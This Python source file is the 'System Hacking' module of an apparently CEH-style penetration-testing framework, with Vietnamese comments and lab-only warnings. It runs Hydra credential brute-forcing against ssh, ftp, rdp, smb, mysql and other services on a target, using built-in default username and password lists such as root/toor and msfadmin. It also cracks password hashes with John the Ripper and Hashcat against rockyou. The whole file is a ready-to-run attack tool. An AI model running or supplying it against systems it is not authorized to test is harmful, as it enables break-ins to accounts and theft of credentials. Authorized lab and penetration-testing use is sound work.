"""Module 06 - System Hacking (credential attacks, password cracking).

⚠️ CHỈ dùng trong lab hoặc hệ thống được phép kiểm thử.
"""
import os
import tempfile
from core.base_module import BaseModule
from core.state import STATE


class Module(BaseModule):
    name = "m06_system_hacking"
    module_id = "06"
    description = "System Hacking (Hydra bruteforce, John/Hashcat, hash-id)"

    def run(self):
        self.logger.info(f"[M06] System Hacking: {self.target}")
        self.logger.warning("[M06] Chỉ chạy trên hệ thống bạn sở hữu/được phép!")
        cfg = self.config

        # Chỉ chạy hydra nếu được bật tường minh
        if cfg.get("hydra", False):
            self.results["hydra"] = self._hydra_services()

        if cfg.get("hash_identify", False):
            self.results["hash_identify"] = self._hash_identify(
                cfg.get("hash_value", "")
            )

        if cfg.get("john", False):
            self.results["john"] = self._john(cfg.get("hash_file"))

        if cfg.get("hashcat", False):
            self.results["hashcat"] = self._hashcat(
                cfg.get("hash_value", ""),
                cfg.get("hash_mode", "0"),
            )
        return self.results

    # ---------- Hydra ----------
    def _hydra_services(self):
        """Thử credential trên các service phát hiện được ở M03/M04."""
        self.logger.info("[M06] Hydra bruteforce...")
        if not self._tool_available("hydra"):
            return self._missing_tool("hydra")

        services = STATE.get("services", []) or []
        if not services:
            # Fallback: thử các port phổ biến nếu M03 chưa chạy
            services = [{"port": 22, "service": "ssh"},
                        {"port": 21, "service": "ftp"}]

        user_list = self._get_user_list()
        pass_list = self._get_pass_list()
        out = {}

        for svc in services:
            proto = svc.get("service", "").lower()
            port = svc.get("port")
            if proto not in ("ssh", "ftp", "telnet", "mysql",
                             "rdp", "smb", "vnc", "http"):
                continue

            cmd = ["hydra", "-L", user_list, "-P", pass_list,
                   "-t", "4", "-f", "-o", "-",
                   f"{self.target}", proto]
            if port:
                cmd += ["-s", str(port)]

            self.logger.info(f"[M06] Hydra: {proto}:{port}")
            out[f"{proto}:{port}"] = self._run_cmd(cmd, timeout=180)[:3000]

        return out

    def _get_user_list(self):
        cfg_path = self.config.get("user_wordlist")
        if cfg_path and os.path.exists(cfg_path):
            return cfg_path
        # Tạo wordlist mặc định
        f = tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".txt")
        f.write("root\nadmin\nadministrator\nuser\nguest\nmsfadmin\npi\n")
        f.close()
        return f.name

    def _get_pass_list(self):
        cfg_path = self.config.get("pass_wordlist")
        if cfg_path and os.path.exists(cfg_path):
            return cfg_path
        f = tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".txt")
        f.write("root\nadmin\npassword\n123456\nmsfadmin\ntoor\nqwerty\ntest\n")
        f.close()
        return f.name

    # ---------- Hash Identify ----------
    def _hash_identify(self, h):
        if not h:
            return {"error": "Chưa cấu hình hash_value"}
        if self._tool_available("hash-identifier"):
            # hash-identifier cần stdin
            try:
                import subprocess
                proc = subprocess.run(
                    ["hash-identifier"], input=h,
                    capture_output=True, text=True, timeout=15)
                return {"output": proc.stdout[:1500]}
            except Exception as e:
                return {"error": str(e)}

        # Fallback: nhận diện qua độ dài
        return {"length": len(h), "guess": self._guess_hash_type(h)}

    def _guess_hash_type(self, h):
        h = h.strip()
        rules = {
            32: "MD5 / NTLM",
            40: "SHA1",
            56: "SHA224",
            64: "SHA256",
            96: "SHA384",
            128: "SHA512",
        }
        if h.startswith("$2"):
            return "bcrypt"
        if h.startswith("$1$"):
            return "MD5-crypt"
        if h.startswith("$6$"):
            return "SHA512-crypt"
        return rules.get(len(h), "Unknown")

    # ---------- John the Ripper ----------
    def _john(self, hash_file):
        self.logger.info("[M06] John the Ripper...")
        if not hash_file or not os.path.exists(hash_file):
            return {"error": "Cần cấu hình hash_file trỏ đến file hash"}
        if not self._tool_available("john"):
            return self._missing_tool("john")

        # Chạy 2 bước: john → john --show
        out_crack = self._run_cmd(
            ["john", "--wordlist=/usr/share/wordlists/rockyou.txt", hash_file],
            timeout=300)
        out_show = self._run_cmd(["john", "--show", hash_file], timeout=30)
        return {"crack": out_crack[:3000], "show": out_show[:3000]}

    # ---------- Hashcat ----------
    def _hashcat(self, h, mode):
        self.logger.info("[M06] Hashcat...")
        if not h:
            return {"error": "Chưa cấu hình hash_value"}
        if not self._tool_available("hashcat"):
            return self._missing_tool("hashcat")

        f = tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".hash")
        f.write(h.strip() + "\n")
        f.close()

        cmd = ["hashcat", "-m", str(mode), "-a", "0",
               f.name, "/usr/share/wordlists/rockyou.txt",
               "--potfile-disable", "--force", "-O"]
        out = self._run_cmd(cmd, timeout=300)[:3000]
        os.unlink(f.name)
        return {"output": out, "hash_mode": mode}